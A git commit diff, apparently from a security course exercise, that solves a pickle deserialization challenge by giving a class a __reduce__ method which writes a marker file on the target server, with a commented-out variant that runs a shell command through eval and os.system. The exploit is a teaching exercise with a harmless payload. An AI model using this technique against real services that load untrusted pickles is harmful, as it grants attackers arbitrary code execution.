bca696b31303f75a08382807af080288a28b40e2
sec673 <673@673.local>
2025-12-04 16:34:10 -0500

    solve bonus-pickler2

--- bonus-pickler2/serialize_me.py
+++ bonus-pickler2/serialize_me.py
@@ -1,3 +1,9 @@
 #Modify attacker.py and use this object to attack vulnerable_server2
+from pathlib import Path
+import builtins
+
 class MyClass(object):
-      myattr = "ECHO THIS"
+    def __reduce__(self):
+      return Path('/tmp/you-got-owned').write_text, ('hi',)
+      #code = "__import__('os').system('touch /tmp/you-got-owned')"
+      #return builtins.eval, (code,)
